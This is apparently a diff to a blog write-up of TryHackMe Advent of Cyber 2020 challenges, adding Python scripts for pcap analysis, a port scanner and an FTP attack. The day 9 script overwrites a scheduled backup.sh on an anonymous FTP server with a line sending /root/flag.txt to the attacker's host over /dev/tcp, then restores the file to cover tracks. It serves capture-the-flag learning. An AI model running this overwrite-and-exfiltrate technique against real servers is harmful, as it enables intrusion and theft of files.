@@ -593,60 +593,368 @@ Total Entries: 1
 
 ## Day 6 ##
 
-- Web
-- Be careful with what you wish on a Christmas night
-- Get familiar with compromising user interactions with vulnerable applications by executing custom javascript code.
-- Javascript XSS
+### Be careful with what you wish on a Christmas night - Web exploitation
+
+> This year, Santa wanted to go fully digital and invented a "Make a wish!" system. It's an extremely simple web app that would allow people to anonymously share their wishes with others. Unfortunately, right after the hacker attack, the security team has discovered that someone has compromised the "Make a wish!". Most of the wishes have disappeared and the website is now redirecting to a malicious website. 
+
+Unfortunately this challenge really had nothing to automate. So no code for today.
 
 ## Day 7 ##
 
-- Special
-- Coal for Christmas
-- Kris Kringle checked his Naughty or Nice List, and he saw that more than a few sysadmins were on the naughty list! He went down the chimney and found old, outdated software, deprecated technologies and a whole environment that was so dirty! Take a look at this server and help prove that this house really deserves coal for Christmas!
-- By John Hammond, a special contributor
-- DirtyCow Privilege Escalation
+### The Grinch Really Did Steal Christmas - Networking
+
+> It's 6 AM and Elf McSkidy is clocking-in to The Best Festival Company's SOC headquarters to begin his watch over TBFC's infrastructure. After logging in, Elf McEager proceeds to read through emails left by Elf McSkidy during the nightshift.
+
+Today's challenge could be solved using the `scapy` library in python and also with calling some fancy `tshark` commands. Not as pure-pythonic as I'd like, but none the less, automated three of the questions.
+
+![](../assets/images/adventofcyber/day7-site.png)
+
+Here are the highlights:
+
+- Open pcap file in scapy
+- Find the ping requests, extract source IP
+- Run tsharking finding all http GET requests
+- Print source ip and request URI
+- Open second pcap file in scapy
+- Extract packets for FTP with the PASS field
+- Get password and final flag
+- Profit.
+
+
+```python
+#!/usr/bin/env python3
+
+import subprocess
+from scapy.all import *
+
+# Question 1
+
+pkts = rdpcap('pcap1.pcap')
+
+for pkt in pkts:
+    if ICMP in pkt and pkt[ICMP].type == 8:
+        answer = pkt[IP].src
+
+print(f"Question 1 answer is {answer}")
+print()
+
+# Question 3
+print("Q3 answer:")
+cmd = 'tshark -r pcap1.pcap -Y "http.request.method==GET" -T fields '
+cmd += ' -e ip.src -e http.request.uri'
+stdoutdata = subprocess.getoutput(cmd)
+print("stdoutdata: " + stdoutdata)
+print()
+
+# Question 4
+pkts = rdpcap('pcap2.pcap')
+
+for pkt in pkts:
+    if TCP in pkt and pkt[TCP].dport == 21:
+        if Raw in pkt and 'PASS' in pkt[Raw].load.decode():
+            password = pkt[Raw].load
+
+print(f'Question 4 answer is {password.split()[1].strip().decode()}')
+
+# Question 6
+
+cmd = "tshark -r mypcap.pcap --export-objects 'http,exportdir'"
+stdoutdata = subprocess.getoutput(cmd)
+```
+The output withe some redacted answers is shown below
+
+```
+Question 1 answer is 10.11.3.2
+
+Q3 answer:
+stdoutdata: 10.10.67.199	/
+10.10.67.199	/fontawesome/css/all.min.css
+10.10.67.199	/css/dark.css
+10.10.67.199	/js/bundle.js
+10.10.67.199	/js/instantpage.min.js
+10.10.67.199	/images/icon.png
+10.10.67.199	/post/index.json
+10.10.67.199	/fonts/noto-sans-jp-v25-japanese_latin-regular.woff2
+10.10.67.199	/fontawesome/webfonts/fa-solid-900.woff2
+10.10.67.199	/fonts/roboto-v20-latin-regular.woff2
+10.10.67.199	/favicon.ico
+10.10.67.199	/
+10.10.67.199	/fontawesome/css/all.min.css
+10.10.67.199	/css/dark.css
+10.10.67.199	/js/bundle.js
+10.10.67.199	/js/instantpage.min.js
+10.10.67.199	/images/icon.png
+10.10.67.199	/post/index.json
+10.10.67.199	/favicon.ico
+10.10.67.199	/fonts/noto-sans-jp-v25-japanese_latin-regular.woff2
+10.10.67.199	/fontawesome/webfonts/fa-solid-900.woff2
+10.10.67.199	/fonts/roboto-v20-latin-regular.woff2
+10.10.67.199	/posts/rein...ek/  <--- ANSWER IS HERE
+10.10.67.199	/posts/post/index.json
+10.10.67.199	/posts/fonts/noto-sans-jp-v25-japanese_latin-regular.woff2
+10.10.67.199	/posts/fonts/roboto-v20-latin-regular.woff2
+10.10.67.199	/posts/fonts/noto-sans-jp-v25-japanese_latin-regular.woff
+10.10.67.199	/posts/fonts/roboto-v20-latin-regular.woff
+
+Question 4 answer is plaint......sco
+
+```
 
 ## Day 8 ##
 
-- Networking
-- The Grinch Really Did Steal Christmas
-- Understand a few of the technologies that power the internet! Use this knowledge to track the activity of the Grinch who stole christmas!
-- Wireshark Packet Analysis
+### What's Under the Christmas Tree? - Networking
+
+> After a few months of probation, intern Elf McEager has passed with glowing feedback from Elf McSkidy. During the meeting, Elf McEager asked for more access to The Best Festival Company's (TBFC's) internal network as he wishes to know more about the systems he has sworn to protect.
+
+In this challenge, you are introducted to NMAP and have to find open ports on the provided VM. You need to then access the webserver and get the title of the page. Nmap is not needed. We will role our own! and the use requests and BeautifulSoup to do the rest.
+
+![](../assets/images/adventofcyber/day8-site.png)
+
+Here are the highlights:
+
+- Read in the top1000 ports from a text file (not provided)
+- Attempt to connect to each port
+- If connect, record the port as open
+- Print the sorted open ports
+- Attempt to connect to each port with requests
+- If connected, build BeautifulSoup object from html
+- Get title of blog
+- Profit
+
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+import requests
+from bs4 import BeautifulSoup as bs
+
+target = "10.10.219.32"
+
+context.log_level = 'error'
+
+with open('top1000.txt') as f:
+    top1000 = f.readline().strip().split(',')
+
+openports = []
+for port in top1000:
+    p = int(port)
+    try:
+        r = remote(target,p)
+        print(f'Connected successfully to {port}')
+        openports.append(p)
+        r.close()
+    except:
+        pass
+
+print(f'Open ports are {sorted(openports)}')
+
+# Access the webserver
+
+for port in openports:
+    url = f"http://{target}:{port}/"
+    try:
+        r = requests.get(url)
+        if r.status_code == 200:
+            soup = bs(r.text, features='lxml')
+            print (soup.title.text)
+    except:
+        pass
+
+```
+
+Trimmed output below.... and flag redacted.
+
+```
+[ERROR] Could not connect to 10.10.219.32 on port 1
+[ERROR] Could not connect to 10.10.219.32 on port 3
+[ERROR] Could not connect to 10.10.219.32 on port 4
+...
+...
+[ERROR] Could not connect to 10.10.219.32 on port 53
+[ERROR] Could not connect to 10.10.219.32 on port 70
+[ERROR] Could not connect to 10.10.219.32 on port 79
+Connected successfully to 80
+[ERROR] Could not connect to 10.10.219.32 on port 81
+[ERROR] Could not connect to 10.10.219.32 on port 82
+...
+...
+[ERROR] Could not connect to 10.10.219.32 on port 2196
+[ERROR] Could not connect to 10.10.219.32 on port 2200
+Connected successfully to 2222
+[ERROR] Could not connect to 10.10.219.32 on port 2251
+[ERROR] Could not connect to 10.10.219.32 on port 2260
+[ERROR] Could not connect to 10.10.219.32 on port 2288
+...
+...
+[ERROR] Could not connect to 10.10.219.32 on port 3371
+[ERROR] Could not connect to 10.10.219.32 on port 3372
+Connected successfully to 3389
+[ERROR] Could not connect to 10.10.219.32 on port 3390
+[ERROR] Could not connect to 10.10.219.32 on port 3404
+...
+...
+[ERROR] Could not connect to 10.10.219.32 on port 65129
+[ERROR] Could not connect to 10.10.219.32 on port 65389
+Open ports are [80, 2222, 3389]
+TBFC'......og
+```
+
 
 ## Day 9 ##
 
-- Networking
-- What's Under the Christmas Tree?
-- Practice the most fundamental stage of penetration testing: information gathering, using industry standard tools/techniques.
-- NMAP
+### Anyone can be Santa! - networking with FTP
+
+> Even Santa has been having to adopt the "work from home" ethic in 2020. To help Santa out, Elf McSkidy and their team created a file server for The Best Festival Company (TBFC) that uses the FTP protocol. However, an attacker was able to hack this new server. Your mission, should you choose to accept it, is to understand how this hack occurred and to retrace the steps of the attacker.
+
+Here is another challenge that was easily scriptable with the `ftplib` and `pwntools` libraries. Overwrite a public script on an FTP server to get a reverse shell.
+
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-10/img3.png)
+
+Here are the highlights:
+
+- connect to ftp server
+- enumerate folders, discovery one with data
+- overwrite `backup.sh` with bash script to exfil flag
+- start netcat listener with pwntools
+- read flag from connection
+- restore `backup.sh` to origial file
+- profit
+
+
+```python
+#!/usr/bin/env python3
+from ftplib import FTP
+from pwn import *
+from binascii import hexlify
+
+context.log_level = 'error'
+
+host = '10.10.66.142'
+LHOST = [redacted]
+
+output = ""
+
+def get(inp):
+    global output
+    output += inp + '\n'
+
+def cleandir(listing):
+    return [l.split(' ')[-1] for l in listing.split('\n') if len(l) > 0 ]
+
+
+ftp = FTP(host)
+ftp.login()
+ftp.dir(get)
+
+directories = cleandir(output)
+
+print(directories)
+
+for directory in directories:
+    output = ""
+    ftp.dir(directory, get)
+    if len(output) > 0:
+        subdir = cleandir(output)
+        print(f'Directory {directory} contains {subdir}')
+        break
+        
+for fname in subdir:
+    output = ""
+    print(f'Downloding {directory}/{fname}\n=================')
+    ftp.retrlines(f'RETR {directory}/{fname}',get)
+    print(output)
+    with open(fname,'w') as f:
+        f.write(output)
+
+exploit = "#!/bin/bash\n"
+exploit += f"cat /root/flag.txt > /dev/tcp/{LHOST}/9001"
+
+target = 'backup.sh'
+
+with open('exploit.sh','w') as f:
+    f.write(exploit)
+
+with open('exploit.sh','rb') as f:
+    ftp.storbinary(f"STOR {directory}/{target}",f)
+
+#confirm upload
+output = ""
+ftp.retrlines(f'RETR {directory}/{target}',get)
+
+# catch flag
+l = listen(port=9001, bindaddr=LHOST)
+flag = l.readline()
+l.close()
+
+print(flag.decode())
+
+# covertracks
+target = "backup.sh"
+with open('backup.sh','rb') as f:
+    ftp.storbinary(f"STOR {directory}/{target}",f)
+
+ftp.close()
+
+```
+
+the output of the above script can be seen here.
+
+```
+['backups', 'elf_workshops', 'human_resources', 'public']
+Directory public contains ['backup.sh', 'shoppinglist.txt']
+Downloding public/backup.sh
+=================
+#!/bin/bash
+
+# Created by ElfMcEager to backup all of Santa's goodies!
+
+# Create backups to include date DD/MM/YYYY
+filename="backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz";
+
+# Backup FTP folder and store in elfmceager's home directory
+tar -zcvf /home/elfmceager/$filename /opt/ftp
+
+# TO-DO: Automate transfer of backups to backup server
+
+
+
+Downloding public/shoppinglist.txt
+=================
+The Polar Express Movie
+
+THM{eve.....anta}
+
+```
 
 ## Day 10 ##
-
-- Networking
-- Anyone can be Santa!
-- Discover a common misconfiguration on file transfer servers, and understand how it may be abused.
-- FTP
-
-## Day 11 ##
 
 - Networking
 - Don't be Elfish!
 - Get hands-on with Samba, a protocol used for sharing resources like files and printers with other devices.
 - SMB
 
-## Day 12 ##
+## Day 11 ##
 
 - Networking
 - The Rogue Gnome
 - We've got intial access, but now what? Learn some of the common linux privilege escalation techniques used to gain permissions to things that we shouldn't..
 - Privilege Escalation Linux
 
-## Day 13 ##
+## Day 12 ##
 
 - Networking
 - Ready, set, elf.
 - Learn how vulnerabilities can be identified, use public knowledgebases to search for exploits and leverage these on this Windows box; So quit slackin' and get whackin'!
 - Public Exploits
+
+## Day 13 ##
+
+- Special
+- Coal for Christmas
+- Kris Kringle checked his Naughty or Nice List, and he saw that more than a few sysadmins were on the naughty list! He went down the chimney and found old, outdated software, deprecated technologies and a whole environment that was so dirty! Take a look at this server and help prove that this house really deserves coal for Christmas!
+- By John Hammond, a special contributor
+- DirtyCow Privilege Escalation
 
 ## Day 14 ##
 
